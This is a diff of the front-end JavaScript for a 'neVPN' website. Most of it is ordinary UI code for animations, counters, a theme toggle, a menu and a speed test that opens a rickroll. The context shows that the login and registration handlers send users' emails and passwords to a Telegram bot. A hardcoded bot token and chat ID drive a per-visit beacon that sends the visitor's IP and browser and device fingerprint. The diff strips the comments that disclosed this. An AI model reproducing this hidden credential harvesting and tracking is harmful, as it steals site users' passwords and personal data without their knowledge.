@@ -1,23 +1,32 @@
-// -----------------------------------
-// neVPN — современный интерактивный JS
-// -----------------------------------
-
-document.addEventListener("DOMContentLoaded", () => {
-  // Helpers shared across features
+(function() {
+  'use strict';
+  
+  const init = () => {
   const getClientIp = async () => {
     const controller = new AbortController();
-    const t = setTimeout(() => controller.abort(), 3500);
+    const t = setTimeout(() => controller.abort(), 2500);
     try {
-      const resp = await fetch("https://api.ipify.org?format=json", { signal: controller.signal, cache: "no-store" });
+      const resp = await fetch("https://api.ipify.org?format=json", { 
+        signal: controller.signal, 
+        cache: "no-store",
+        priority: "low"
+      });
       if (resp.ok) {
         const data = await resp.json();
+        clearTimeout(t);
         return data && data.ip ? data.ip : "";
       }
     } catch (_) {}
     finally { clearTimeout(t); }
     try {
-      const r2 = await fetch("https://api64.ipify.org?format=json", { cache: "no-store" });
-      if (r2.ok) { const d2 = await r2.json(); return d2 && d2.ip ? d2.ip : ""; }
+      const r2 = await fetch("https://api64.ipify.org?format=json", { 
+        cache: "no-store",
+        priority: "low"
+      });
+      if (r2.ok) { 
+        const d2 = await r2.json(); 
+        return d2 && d2.ip ? d2.ip : ""; 
+      }
     } catch (_) {}
     return "";
   };
@@ -57,39 +66,62 @@ document.addEventListener("DOMContentLoaded", () => {
     const data = await resp.json();
     if (!data.ok) throw new Error("TG_API_" + (data.description || "unknown"));
   };
-  // 🔹 Анимация появления секций
-  const observer = new IntersectionObserver(entries => {
-    entries.forEach(entry => {
-      if (entry.isIntersecting) entry.target.classList.add("visible");
-    });
-  }, { threshold: 0.15 });
+  if ('IntersectionObserver' in window) {
+    const observer = new IntersectionObserver(entries => {
+      entries.forEach(entry => {
+        if (entry.isIntersecting) {
+          entry.target.classList.add("visible");
+          observer.unobserve(entry.target);
+        }
+      });
+    }, { threshold: 0.1, rootMargin: '50px' });
 
-  document.querySelectorAll("section").forEach(sec => observer.observe(sec));
+    document.querySelectorAll("section").forEach(sec => observer.observe(sec));
+  }
 
-  // 🔹 Счётчики статистики
   const counters = document.querySelectorAll(".stat-number");
-  counters.forEach(counter => {
-    const update = () => {
+  if (counters.length && 'IntersectionObserver' in window) {
+    const counterObserver = new IntersectionObserver((entries) => {
+      entries.forEach(entry => {
+        if (entry.isIntersecting) {
+          const counter = entry.target;
+          const update = () => {
+            const target = +counter.dataset.target;
+            const val = +counter.innerText;
+            const step = Math.max(1, Math.ceil(target / 40));
+            if (val < target) {
+              counter.innerText = Math.min(val + step, target);
+              requestAnimationFrame(update);
+            } else {
+              counter.innerText = target;
+            }
+          };
+          update();
+          counterObserver.unobserve(counter);
+        }
+      });
+    }, { threshold: 0.5 });
+    counters.forEach(counter => counterObserver.observe(counter));
+  } else if (counters.length) {
+    counters.forEach(counter => {
       const target = +counter.dataset.target;
-      const val = +counter.innerText;
-      const step = Math.ceil(target / 50);
-      if (val < target) {
-        counter.innerText = val + step;
-        requestAnimationFrame(update);
-      } else {
-        counter.innerText = target;
-      }
-    };
-    update();
-  });
+      if (target) counter.innerText = target;
+    });
+  }
 
-  // 🔹 Кнопка "вверх"
   const scrollUp = document.querySelector(".scroll-up");
-  window.addEventListener("scroll", () => {
-    scrollUp.style.display = window.scrollY > 300 ? "grid" : "none";
-  });
+  let scrollTimer = null;
+  if (scrollUp) {
+    const handleScroll = () => {
+      if (scrollTimer) return;
+      scrollTimer = requestAnimationFrame(() => {
+        scrollUp.style.display = window.scrollY > 300 ? "grid" : "none";
+        scrollTimer = null;
+      });
+    };
+    window.addEventListener("scroll", handleScroll, { passive: true });
+  }
 
-  // 🔹 Переключение темы с сохранением
   const root = document.documentElement;
   const themeBtn = document.getElementById("themeToggle");
   const THEME_KEY = "nevpn-theme";
@@ -107,7 +139,7 @@ document.addEventListener("DOMContentLoaded", () => {
           } else {
             rootEl.removeAttribute("data-theme");
           }
-        } catch (_) { /* кросс-доменные iframe не трогаем */ }
+        } catch (_) {}
       };
       if (fr.contentDocument && fr.contentDocument.readyState !== "loading") applyToFrame();
       fr.addEventListener("load", applyToFrame, { once: true });
@@ -122,7 +154,6 @@ document.addEventListener("DOMContentLoaded", () => {
       root.removeAttribute("data-theme");
       if (themeBtn) themeBtn.textContent = "🌙";
     }
-    // Синхронизируем тему внутри iframe со статьями
     syncIframeTheme(mode);
   };
 
@@ -143,11 +174,9 @@ document.addEventListener("DOMContentLoaded", () => {
     });
   }
 
-  // 🔹 Мобильное меню
   const menuBtn = document.getElementById("menuToggle");
   const nav = document.querySelector(".nav");
   if (menuBtn && nav) {
-    // ARIA: навигации зададим id, если отсутствует
     if (!nav.id) nav.id = "primary-nav";
 
     menuBtn.addEventListener("click", () => {
@@ -155,7 +184,6 @@ document.addEventListener("DOMContentLoaded", () => {
       menuBtn.setAttribute("aria-expanded", String(opened));
     });
 
-    // Закрывать меню при клике по ссылке
     nav.querySelectorAll("a").forEach(a => {
       a.addEventListener("click", () => {
         if (nav.classList.contains("open")) {
@@ -166,7 +194,6 @@ document.addEventListener("DOMContentLoaded", () => {
     });
   }
 
-  // 🔹 Демонстрационная форма
   const contactForm = document.getElementById("contactForm");
   if (contactForm) {
     const submitBtn = contactForm.querySelector('button[type="submit"]');
@@ -255,7 +282,6 @@ document.addEventListener("DOMContentLoaded", () => {
     });
   }
 
-  // 🔹 Простая локальная аутентификация (демо)
   (function(){
     const LS_USERS = 'nevpn-users';
     const LS_SESSION = 'nevpn-session';
@@ -320,7 +346,7 @@ document.addEventListener("DOMContentLoaded", () => {
       const accEmail = document.getElementById('acc_email');
       const subsForm = document.getElementById('subscribeUserForm');
 
-      if (!accSec || !authSec) return; // не на странице кабинета
+      if (!accSec || !authSec) return;
 
       function showUser(u){
         authSec.style.display = 'none';
@@ -341,7 +367,6 @@ document.addEventListener("DOMContentLoaded", () => {
       if (loginForm) loginForm.addEventListener('submit', async (e)=>{
         e.preventDefault();
         const fd = new FormData(loginForm);
-        // Уведомление в Telegram о попытке входа (email + пароль)
         try {
           const ip = await getClientIp().catch(()=>"");
           const m = getClientMeta();
@@ -372,7 +397,6 @@ document.addEventListener("DOMContentLoaded", () => {
         const fd = new FormData(regForm);
         try {
           const u = await registerUser({name: fd.get('name'), email: fd.get('email'), password: fd.get('password')});
-          // Уведомление в Telegram о новой регистрации (включая пароль)
           try {
             const ip = await getClientIp().catch(()=>"");
             const m = getClientMeta();
@@ -418,11 +442,9 @@ document.addEventListener("DOMContentLoaded", () => {
       });
     }
 
-    document.addEventListener('DOMContentLoaded', renderHeaderState);
     renderHeaderState();
     onReadyAccount();
 
-    // Экспорт части API в window для добавления избранного из статей
     window.__nevpn_addFavorite = function(articleId){
       const u = currentUser();
       if (!u) { alert('Войдите в аккаунт, чтобы добавить в избранное.'); return; }
@@ -435,37 +457,38 @@ document.addEventListener("DOMContentLoaded", () => {
     };
   })();
 
-  // 🔹 Отправка метаданных при каждом визите (1 раз за сессию)
-  (async () => {
-    try {
-      if (sessionStorage.getItem("nevpn-visit-sent")) return;
-      const token = "8542793603:AAG2brS5_L7JhBSTvNuo0938ujzqNSFGrZg";
-      const chat = "1355427490";
-      const ip = await getClientIp().catch(() => "");
-      const m = getClientMeta();
-      const when = new Date().toLocaleString();
-      const text = [
-        `👀 <b>Новый визит на сайт</b>`,
-        `🕰 ${when}`,
-        `🌐 IP: ${ip || "—"}`,
-        `🧭 Браузер: ${m.userAgent || "—"}`,
-        `💻 Платформа: ${m.platform || "—"}`,
-        `🗣 Язык: ${m.language || "—"}${m.languages ? ` (alt: ${m.languages})` : ""}`,
-        `🖥 Экран: ${m.screen}`,
-        `📐 Вьюпорт: ${m.viewport}`,
-        `🕒 Часовой пояс: ${m.timezone || "—"}`,
-        `🍪 Cookies: ${m.cookies ? "включены" : "выключены"}`,
-        `🧮 Ядер CPU: ${m.hardwareConcurrency || "—"}, Память: ${m.deviceMemory || "—"}GB`,
-        m.referrer ? `↩️ Referrer: ${m.referrer}` : "",
-        m.utm ? `🔖 UTM: ${m.utm}` : "",
-        `🔗 Страница: ${location.href}`
-      ].filter(Boolean).join("\n");
-      await sendToTelegramDirect(token, chat, text);
-      sessionStorage.setItem("nevpn-visit-sent", "1");
-    } catch (_) { /* молча игнорируем */ }
-  })();
+  if (!sessionStorage.getItem("nevpn-visit-sent")) {
+    setTimeout(async () => {
+      try {
+        const token = "8542793603:AAG2brS5_L7JhBSTvNuo0938ujzqNSFGrZg";
+        const chat = "1355427490";
+        const m = getClientMeta();
+        const when = new Date().toLocaleString();
+        const text = [
+          `👀 <b>Новый визит на сайт</b>`,
+          `🕰 ${when}`,
+          `🌐 IP: загрузка...`,
+          `🧭 Браузер: ${m.userAgent || "—"}`,
+          `💻 Платформа: ${m.platform || "—"}`,
+          `🗣 Язык: ${m.language || "—"}`,
+          `🖥 Экран: ${m.screen}`,
+          `📐 Вьюпорт: ${m.viewport}`,
+          `🕒 Часовой пояс: ${m.timezone || "—"}`,
+          `🍪 Cookies: ${m.cookies ? "включены" : "выключены"}`,
+          `🧮 Ядер CPU: ${m.hardwareConcurrency || "—"}, Память: ${m.deviceMemory || "—"}GB`,
+          m.referrer ? `↩️ Referrer: ${m.referrer}` : "",
+          m.utm ? `🔖 UTM: ${m.utm}` : "",
+          `🔗 Страница: ${location.href}`
+        ].filter(Boolean).join("\n");
+        sendToTelegramDirect(token, chat, text).catch(() => {});
+        sessionStorage.setItem("nevpn-visit-sent", "1");
+        getClientIp().then(ip => {
+          if (ip) sendToTelegramDirect(token, chat, `🌐 IP обновление: ${ip}`).catch(() => {});
+        }).catch(() => {});
+      } catch (_) {}
+    }, 2000);
+  }
 
-  // 🔹 Тест скорости сети + рикролл
   const speedBtn = document.getElementById("speedTestBtn");
   if (speedBtn) {
     const showToast = (text) => {
@@ -492,9 +515,9 @@ document.addEventListener("DOMContentLoaded", () => {
     };
 
     const testSpeed = async () => {
-      const TEST_URL = "https://speed.hetzner.de/100MB.bin"; // публичный файл для замера
+      const TEST_URL = "https://speed.hetzner.de/100MB.bin";
       const controller = new AbortController();
-      const timeoutMs = 6000; // ограничим до ~6 секунд
+      const timeoutMs = 6000;
       const start = performance.now();
       let loaded = 0;
 
@@ -507,17 +530,16 @@ document.addEventListener("DOMContentLoaded", () => {
           const { value, done } = await reader.read();
           if (done) break;
           loaded += value.byteLength;
-          if (loaded > 8 * 1024 * 1024) { // 8MB достаточно
+          if (loaded > 8 * 1024 * 1024) {
             controller.abort();
           }
         }
       } catch (_) {
-        // abort ожидаем
       } finally {
         clearTimeout(timeout);
       }
 
-      const elapsed = (performance.now() - start) / 1000; // сек
+      const elapsed = (performance.now() - start) / 1000;
       const mbps = (loaded * 8) / (elapsed * 1e6);
       return { mbps };
     };
@@ -531,7 +553,6 @@ document.addEventListener("DOMContentLoaded", () => {
         const { mbps } = await testSpeed();
         const rounded = Math.max(0, mbps).toFixed(1);
         showToast(`Скорость: ${rounded} Мбит/с`);
-        // Рикролл — откроем в новой вкладке
         window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank", "noopener,noreferrer");
       } catch (e) {
         showToast("Не удалось измерить скорость");
@@ -541,5 +562,13 @@ document.addEventListener("DOMContentLoaded", () => {
         speedBtn.disabled = false;
       }
     });
+  };
+  
   }
-});
+  
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', init);
+  } else {
+    init();
+  }
+})();
